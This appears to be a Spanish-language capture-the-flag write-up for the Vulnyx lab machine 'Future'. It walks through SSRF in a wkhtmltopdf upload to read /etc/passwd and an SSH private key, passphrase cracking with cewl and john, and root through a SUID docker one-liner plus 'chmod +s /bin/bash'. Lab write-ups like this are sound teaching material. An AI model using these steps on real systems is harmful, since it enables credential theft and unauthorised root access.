---
layout: post
title: Future - Vulnyx
---

# Writeup
![Future]({{'/assets/img/Future/future.png' | relative_url}})

Vulnyx

----------------------------------------------------------------------------------------------

Iniciamos el escaneo con **Nmap** en busca de puertos expuestos y reconocer los sevicios que los ocupan, para posteriormente buscar vulnerabilidades.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.2.95 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-07 19:32 CEST
Initiating ARP Ping Scan at 19:32
Scanning 192.168.2.95 [1 port]
Completed ARP Ping Scan at 19:32, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:32
Scanning 192.168.2.95 [65535 ports]
Discovered open port 22/tcp on 192.168.2.95
Discovered open port 80/tcp on 192.168.2.95
Completed SYN Stealth Scan at 19:32, 0.56s elapsed (65535 total ports)
Nmap scan report for 192.168.2.95
Host is up, received arp-response (0.000083s latency).
Scanned at 2024-04-07 19:32:07 CEST for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:A7:1C:16 (Oracle VirtualBox virtual NIC)
```
```bash
❯ nmap -sCV -p22,80 192.168.2.95 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-07 19:36 CEST
Nmap scan report for future (192.168.2.95)
Host is up (0.00018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: future.nyx
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:A7:1C:16 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos observar que tenemos por un lado puerto 22 *ssh* y puerto 80 *http*. Empezare a investigar el sitio web.

Hare una busqueda de direcctorios en la web con **dirbuster** y buscar tambien por extensiones **php, html**.

```bash
❯ dirbuster -u http://192.168.2.95 -l /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
File found: /process.php - 500
File found: /transition/index.html - 200
File found: /1955.html - 200
File found: /2015.html - 200
File found: /1885.html - 200
File found: /homework.html - 200
```
Se puede observer una pagina inicial, con un pequeño video de transicion, posteriormente lo que parece mas interesante a primera vista es, el apartado para subir archivo *html* que el servidor convierte a *pdf*
![web2]({{'/assets/img/Future/web2.png' | relative_url}})
![upload]({{'/assets/img/Future/upload.png' | relative_url}})

Adjunto enlaces de donde he ido recopilando informacion acer de como explotar la subida de archivo convirtiendolo en **pdf**.

[WKhtmltopdf](https://wkhtmltopdf.org/)   
[SSRF exploiting PDF file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#file)

Hago una prueva para provar si es vulnerable a **SSRF** (Server Side Resquest Forgery). Esto le permite a un atacante hacer conexión con servicios de la infraestructura interna donde se aloja la web y exfiltrar información sensible.
![test]({{'/assets/img/Future/SSRF.png' | relative_url}})
```bash
❯ nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.2.128] from (UNKNOWN) [192.168.2.95] 45430
GET /y=testSSRF HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 192.168.2.128:1234
```

A continuacion confecciono un codigo para volver a enviar una peticion y poder leer el archivo **/etc/passwd** de la maquina victima.
![HTML]({{'/assets/img/Future/html.png' | relative_url}})
![data]({{'/assets/img/Future/data.png' | relative_url}})

Esto me devuelve el contenido en formato **base64** se le aplicara un decode para poder tener el contenido en texto claro.
```bash
❯ echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMDoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTAxOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbWFydHkubWNmbHk6eDoxMDAwOjEwMDA6Oi9ob21lL21hcnR5Lm1jZmx5Oi9iaW4vYmFzaAplbW1ldHQuYnJvd246eDoxMDAxOjEwMDE6Oi9ob21lL2VtbWV0dC5icm93bjovYmluL2Jhc2gK' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
marty.mcfly:x:1000:1000::/home/marty.mcfly:/bin/bash
emmett.brown:x:1001:1001::/home/emmett.brown:/bin/bash
```
Bien veo un par de ususarios en este caso el que nos intesera es **marty.mcfly** intentare leer la carpeta .ssh y ver si tiene una clave id_rsa.
![html-idrsa]({{'/assets/img/Future/idrsa.png' | relative_url}})

Perfecto tenemos clave **ssh** volvemos a aplicar un decode con **base64 -d** para obtener el contenido y copiarlo en un archivo en mi maquina.

![id_rsa]({{'/assets/img/Future/idrsa-dcode.png' | relative_url}})

Me intento conectar a traves de **ssh** pero al parecer la propia id_rsa aparte esta protegida con otra clave...habra que buscar.
```bash
❯ ssh marty.mcfly@192.168.2.95 -i id_rsa
Enter passphrase for key 'id_rsa': 
```
Una solucion que  se me ocurre es crear un diccionario propio ya que el famoso **rockyou** no me vale en este caso. 
Usare el programa **cewl** para confeccionar mi propia **wordlist** con el texto de los html de la web victima y volver a intentarlo de nuevo.

```bash
❯ cewl http://192.168.2.95/1955.html -m 6 -w dict1
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ cewl http://192.168.2.95/2015.html -m 6 -w dict2
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ cewl http://192.168.2.95/1885.html -m 6 -w dict3
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ ls
 dict1   dict2   dict3
❯ cat dict1 dict2 dict3 > wordlist.txt
❯ cat wordlist.txt | wc -l
222
```
A continuacion extraigo el hash del archivo id_rsa para posteriormente hacer fuerza bruta.
```bash
❯ ssh2john id_rsa > hash

❯ john --wordlist=wordlist.txt hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
in*********ly    (id_rsa)     
1g 0:00:00:00 DONE (2024-04-07 21:49) 1.075g/s 103.2p/s 103.2c/s 103.2C/s future..travel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Y tengo la contraseña, hora de conectarme.
```bash
❯ ssh marty.mcfly@192.168.2.95 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux future 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar 26 10:38:34 2024 from 192.168.1.45
marty.mcfly@future:~$ whoami
marty.mcfly
marty.mcfly@future:~$ export TERM=xterm
marty.mcfly@future:~$ hostname -I
192.168.2.95 172.17.0.1
```
Efectivamenete ya estoy en la maquina victima y podemos ver la primera **flag** de bajos privilegio, toca la escalada y ser root. 
```bash
marty.mcfly@future:~$ ls
user.txt
marty.mcfly@future:~$ cat user.txt 
fe1**************************e35
```
Busco archivos con permisos SUID que puedan ser vulnerables y me llama la atencion **docker**
```bash
marty.mcfly@future:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/docker
```
En efecto mirando esta web marabilla **gtfobins** encuentro lo que podria ser la solucion.
[GTFOBins - Dockers - SUID](https://gtfobins.github.io/gtfobins/docker/)

![gtfobins-web]({{'/assets/img/Future/docker-suid.png' | relative_url}})

Ejecutamos el comandito que nos proporcina la web. 
Con esta imagen nos crea una copia nuestro directorio y como tiene privilegio SUID una vez que estamos en el contenedor estamos como root asi que podemos modificar los permisos de **/bin/bash** para que tambien sea SUID y al salir ejecutamos una bash con privilegios y eso seria todo.
```bash
marty.mcfly@future:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
4abcf2066143: Pull complete 
Digest: sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b
Status: Downloaded newer image for alpine:latest
# whoami
root
# chmod +s /bin/bash
# exit
marty.mcfly@future:~$ bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt 
69c**************************b3d
```

Espro que te pueda servir de ayuda. GRACIAS por venir.
